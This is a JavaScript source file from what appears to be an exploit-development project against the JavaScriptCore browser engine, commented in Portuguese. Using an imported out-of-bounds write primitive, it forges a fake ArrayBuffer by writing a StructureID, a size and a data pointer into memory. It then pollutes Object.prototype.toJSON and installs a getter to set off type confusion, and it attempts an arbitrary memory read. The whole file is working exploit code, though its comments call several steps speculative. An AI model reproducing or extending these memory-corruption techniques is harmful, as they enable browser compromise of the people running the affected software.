// js/script3/testFakeArrayBufferSimple.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GADGET_PROPERTY_NAME_CHECKPOINT = "AAAA_GetterForFakeABCheck";

// Objeto simples cujo getter será usado como checkpoint
class CheckpointObject {
    constructor(id) {
        this.id = `CheckpointObj-${id}`;
        this.marker = 0xABCDEF00;
        this.prop_to_corrupt_for_fake_ab_offset = null; // Será o alvo da type confusion
    }
}

// toJSON que aciona o getter no CheckpointObject
export function toJSON_TriggerCheckpointGetterForFakeAB() {
    const FNAME_toJSON = "toJSON_TriggerCheckpointGetterForFakeAB";
    let returned_payload = { _variant_: FNAME_toJSON, _id_at_entry_: String(this?.id || "N/A") };
    try {
        for (const prop in this) {
            if (Object.prototype.hasOwnProperty.call(this, prop) || CheckpointObject.prototype.hasOwnProperty(prop)) {
                returned_payload[prop] = this[prop];
            }
        }
    } catch (e) { returned_payload._ERROR_IN_LOOP_ = `${e.name}: ${e.message}`; }
    return returned_payload;
}

export async function executeFakeArrayBufferSimpleTest() {
    const FNAME_TEST = "executeFakeArrayBufferSimpleTest";
    logS3(`--- Iniciando Teste: ArrayBuffer Falso Simplificado com StructureID=2 ---`, "test", FNAME_TEST);
    document.title = `Fake AB Simple (ID=2)`;

    if (!JSC_OFFSETS.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID || JSC_OFFSETS.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID !== 2) {
        logS3(`ERRO CRÍTICO: JSC_OFFSETS.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID não é 2 no config.mjs. Teste abortado.`, "error", FNAME_TEST);
        logS3(`Por favor, atualize config.mjs: JSC_OFFSETS.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID = 2;`, "error", FNAME_TEST);
        return;
    }

    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha ao configurar ambiente OOB. Teste abortado.", "error", FNAME_TEST);
        return;
    }

    // --- Configuração do JSArrayBuffer Falso Simplificado ---
    // Este AB falso terá seus campos m_dataPointer e m_sizeInBytes diretamente nele,
    // como sugerido pelo snippet JSC::ArrayBuffer::create.
    const fake_JSArrayBuffer_offset_in_oob = 0x300; // Onde nosso JSArrayBuffer falso começa

    // Endereço que queremos que nosso ArrayBuffer falso leia (ex: uma área de baixo endereço)
    const target_read_address = new AdvancedInt64("0x00000000", "0x00010000"); // Ex: 0x100000000
    const read_size_val = 0x100; // Tamanho da leitura em bytes (256)

    logS3(`Construindo JSArrayBuffer Falso (Simplificado) em oob_ab_real[${toHex(fake_JSArrayBuffer_offset_in_oob)}]`, "info", FNAME_TEST);
    logS3(`  Target m_dataPointer (a ser escrito em JSAB[${toHex(JSC_OFFSETS.ArrayBuffer.DATA_POINTER_COPY_OFFSET_FROM_JSARRAYBUFFER_START)}]): ${target_read_address.toString(true)}`, "info", FNAME_TEST);
    logS3(`  Target m_sizeInBytes (a ser escrito em JSAB[${toHex(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START)}]): ${toHex(read_size_val)} bytes`, "info", FNAME_TEST);

    let structure_id_to_write = JSC_OFFSETS.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID; // Deverá ser 2

    // 1. Escrever StructureID (offset 0x0 do JSArrayBuffer falso)
    try {
        oob_write_absolute(fake_JSArrayBuffer_offset_in_oob + 0x0, structure_id_to_write, 4); // DWORD
        logS3(`   Campo StructureID (${toHex(structure_id_to_write)}) escrito em +0x0`, "good", FNAME_TEST);
    } catch (e) { logS3(`   ERRO ao escrever StructureID: ${e.message}`, "error", FNAME_TEST); return; }

    // 2. Zerar o campo Structure* (offset 0x8)
    try {
        oob_write_absolute(fake_JSArrayBuffer_offset_in_oob + JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET, AdvancedInt64.Zero, 8);
        logS3(`   Campo Structure* (em +${toHex(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET)}) zerado.`, "good", FNAME_TEST);
    } catch (e) { logS3(`   ERRO ao zerar Structure*: ${e.message}`, "error", FNAME_TEST); return; }

    // 3. Escrever m_sizeInBytes no offset do JSArrayBuffer (ex: 0x18)
    try {
        oob_write_absolute(fake_JSArrayBuffer_offset_in_oob + JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, read_size_val, 4); // DWORD
        logS3(`   Campo m_sizeInBytes (${toHex(read_size_val)}) escrito em +${toHex(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START)}`, "good", FNAME_TEST);
    } catch (e) { logS3(`   ERRO ao escrever m_sizeInBytes: ${e.message}`, "error", FNAME_TEST); return; }

    // 4. Escrever m_dataPointer no offset do JSArrayBuffer (ex: 0x20)
    try {
        oob_write_absolute(fake_JSArrayBuffer_offset_in_oob + JSC_OFFSETS.ArrayBuffer.DATA_POINTER_COPY_OFFSET_FROM_JSARRAYBUFFER_START, target_read_address, 8); // QWORD
        logS3(`   Campo m_dataPointer (${target_read_address.toString(true)}) escrito em +${toHex(JSC_OFFSETS.ArrayBuffer.DATA_POINTER_COPY_OFFSET_FROM_JSARRAYBUFFER_START)}`, "good", FNAME_TEST);
    } catch (e) { logS3(`   ERRO ao escrever m_dataPointer: ${e.message}`, "error", FNAME_TEST); return; }

    // --- Verificação da Escrita (Opcional, mas bom para debug) ---
    logS3(`Verificando escrita do JSArrayBuffer Falso...`, "info", FNAME_TEST);
    try {
        const chk_sid = oob_read_absolute(fake_JSArrayBuffer_offset_in_oob + 0x0, 4);
        const chk_sptr = oob_read_absolute(fake_JSArrayBuffer_offset_in_oob + JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET, 8);
        const chk_size = oob_read_absolute(fake_JSArrayBuffer_offset_in_oob + JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, 4);
        const chk_dptr = oob_read_absolute(fake_JSArrayBuffer_offset_in_oob + JSC_OFFSETS.ArrayBuffer.DATA_POINTER_COPY_OFFSET_FROM_JSARRAYBUFFER_START, 8);
        logS3(`  Lido de FakeJSAB[0x0] (StructureID): ${toHex(chk_sid)} (Esperado: ${toHex(structure_id_to_write)})`, "info", FNAME_TEST);
        logS3(`  Lido de FakeJSAB[${toHex(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET)}] (Structure*): ${isAdvancedInt64Object(chk_sptr) ? chk_sptr.toString(true) : toHex(chk_sptr)} (Esperado: 0x0)`, "info", FNAME_TEST);
        logS3(`  Lido de FakeJSAB[${toHex(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START)}] (Size): ${toHex(chk_size)} (Esperado: ${toHex(read_size_val)})`, "info", FNAME_TEST);
        logS3(`  Lido de FakeJSAB[${toHex(JSC_OFFSETS.ArrayBuffer.DATA_POINTER_COPY_OFFSET_FROM_JSARRAYBUFFER_START)}] (DataPtr): ${isAdvancedInt64Object(chk_dptr) ? chk_dptr.toString(true) : toHex(chk_dptr)} (Esperado: ${target_read_address.toString(true)})`, "info", FNAME_TEST);

        if (chk_sid === structure_id_to_write &&
            isAdvancedInt64Object(chk_sptr) && chk_sptr.equals(AdvancedInt64.Zero) &&
            chk_size === read_size_val &&
            isAdvancedInt64Object(chk_dptr) && chk_dptr.equals(target_read_address)) {
            logS3("    Verificação da escrita do Fake JSArrayBuffer bem-sucedida!", "good", FNAME_TEST);
        } else {
            logS3("    AVISO: Discrepância na verificação da escrita do Fake JSArrayBuffer.", "warn", FNAME_TEST);
        }
    } catch (e) { logS3(`  ERRO ao verificar escrita do FakeJSAB: ${e.message}`, "error", FNAME_TEST); }


    // --- Tentativa de Usar o Fake AB via Getter e Corrupção de Propriedade ---
    // Esta parte é altamente especulativa.
    // Precisamos que a escrita OOB em [0x70] faça com que
    // checkpoint_obj.prop_to_corrupt_for_fake_ab_offset se torne o *offset*
    // fake_JSArrayBuffer_offset_in_oob DENTRO de oob_array_buffer_real.

    const corruption_offset_trigger = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    const corruption_value_trigger = 0xABABABAB; // Um valor diferente para o trigger

    logS3(`Escrevendo valor trigger ${toHex(corruption_value_trigger)} em oob_ab_real[${toHex(corruption_offset_trigger)}] para acionar getter...`, "info", FNAME_TEST);
    try {
        oob_write_absolute(corruption_offset_trigger, corruption_value_trigger, 4);
    } catch(e) { logS3(`Erro ao escrever valor trigger OOB: ${e.message}`, "error", FNAME_TEST); clearOOBEnvironment(); return; }

    let checkpoint_obj = new CheckpointObject(0);
    let originalGetterDesc = Object.getOwnPropertyDescriptor(CheckpointObject.prototype, GADGET_PROPERTY_NAME_CHECKPOINT);
    let getterPollutionApplied = false;
    let ppKey_val = 'toJSON';
    let originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let toJSONPollutionApplied = false;
    let leak_successful = false;

    try {
        Object.defineProperty(CheckpointObject.prototype, GADGET_PROPERTY_NAME_CHECKPOINT, {
            get: function() {
                const GETTER_FNAME = "CheckpointGetter_UseFakeAB";
                logS3(`!!!! GETTER CHECKPOINT '${GADGET_PROPERTY_NAME_CHECKPOINT}' FOI CHAMADO !!!! (ID: ${this.id})`, "vuln", GETTER_FNAME);
                this.marker = 0xB00B1E55; // Indicar chamada

                // ESPECULATIVO: this.prop_to_corrupt_for_fake_ab_offset foi corrompido para
                // conter o fake_JSArrayBuffer_offset_in_oob (ex: 0x300)?
                const potential_fake_ab_offset = this.prop_to_corrupt_for_fake_ab_offset;
                logS3(`   [${GETTER_FNAME}] Valor de this.prop_to_corrupt_for_fake_ab_offset: ${toHex(potential_fake_ab_offset)} (typeof: ${typeof potential_fake_ab_offset})`, "info", GETTER_FNAME);

                if (typeof potential_fake_ab_offset === 'number' && potential_fake_ab_offset === fake_JSArrayBuffer_offset_in_oob) {
                    logS3(`   [${GETTER_FNAME}] Potencialmente encontramos o offset para o Fake AB (${toHex(potential_fake_ab_offset)})!`, "leak", GETTER_FNAME);
                    logS3(`   Isto NÃO significa que podemos usá-lo como um objeto JS diretamente.`, "warn", GETTER_FNAME);
                    logS3(`   Para ler, usaríamos oob_read_absolute no m_dataPointer do Fake AB, o que já fizemos na construção.`, "info", GETTER_FNAME);
                    logS3(`   O m_dataPointer do nosso Fake AB aponta para ${target_read_address.toString(true)}.`, "info", GETTER_FNAME);
                    logS3(`   Se pudéssemos fazer 'new DataView(ENDERECO_DE_MEMORIA_DE_OOB_AB_REAL + ${toHex(potential_fake_ab_offset)})', aí sim.`, "info", GETTER_FNAME);
                    // Para realmente testar a leitura *através* do FakeAB, precisaríamos de uma forma de
                    // passar o *endereço de memória* do fake_JSArrayBuffer_offset_in_oob para new DataView().
                    // O que podemos fazer é usar o oob_read_absolute para ler do target_read_address que definimos no fake AB.
                    try {
                        logS3(`   Tentando ler do target_read_address (${target_read_address.toString(true)}) usando oob_read_absolute (como se o FakeAB funcionasse)...`, "info", GETTER_FNAME);
                        const val_from_target = oob_read_absolute(target_read_address, 4); // Ler um DWORD
                        logS3(`     LEITURA ARBITRÁRIA ESPECULATIVA (via FakeAB conceitual): *(${target_read_address.toString(true)}) = ${toHex(val_from_target)}`, "critical", GETTER_FNAME);
                        leak_successful = true;
                    } catch (e_read_target) {
                        logS3(`     ERRO ao tentar leitura arbitrária especulativa: ${e_read_target.message}`, "error", GETTER_FNAME);
                    }
                } else {
                    logS3(`   [${GETTER_FNAME}] this.prop_to_corrupt_for_fake_ab_offset não parece ser o offset esperado.`, "info", GETTER_FNAME);
                }
                return "getter_check_done";
            },
            configurable: true, enumerable: true
        });
        getterPollutionApplied = true;

        Object.defineProperty(Object.prototype, ppKey_val, { value: toJSON_TriggerCheckpointGetterForFakeAB, writable: true, configurable: true, enumerable: false });
        toJSONPollutionApplied = true;

        logS3(`Tentando acionar getter em CheckpointObject para testar Fake AB...`, "info", FNAME_TEST);
        JSON.stringify(checkpoint_obj); // Aciona o getter

    } catch (e) {
        logS3(`Erro durante a configuração/execução do getter para Fake AB: ${e.message}`, "error", FNAME_TEST);
    } finally {
        // Cleanup
        if (toJSONPollutionApplied) {
            if (originalToJSONProtoDesc) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDesc);
            else delete Object.prototype[ppKey_val];
        }
        if (getterPollutionApplied && CheckpointObject.prototype.hasOwnProperty(GADGET_PROPERTY_NAME_CHECKPOINT)) {
            if (originalGetterDesc) Object.defineProperty(CheckpointObject.prototype, GADGET_PROPERTY_NAME_CHECKPOINT, originalGetterDesc);
            else delete CheckpointObject.prototype[GADGET_PROPERTY_NAME_CHECKPOINT];
        }
    }

    if (leak_successful) {
        logS3("SUCESSO ESPECULATIVO: Uma leitura arbitrária parece ter sido realizada!", "vuln", FNAME_TEST);
        document.title = "Fake AB Read SUCCESS!";
    } else {
        logS3("Nenhum vazamento óbvio via Fake AB nesta tentativa.", "warn", FNAME_TEST);
    }

    clearOOBEnvironment();
    logS3(`--- Teste ArrayBuffer Falso Simplificado CONCLUÍDO ---`, "test", FNAME_TEST);
    if (!document.title.includes("SUCCESS")) {
        document.title = `Fake AB Simple Done`;
    }
}
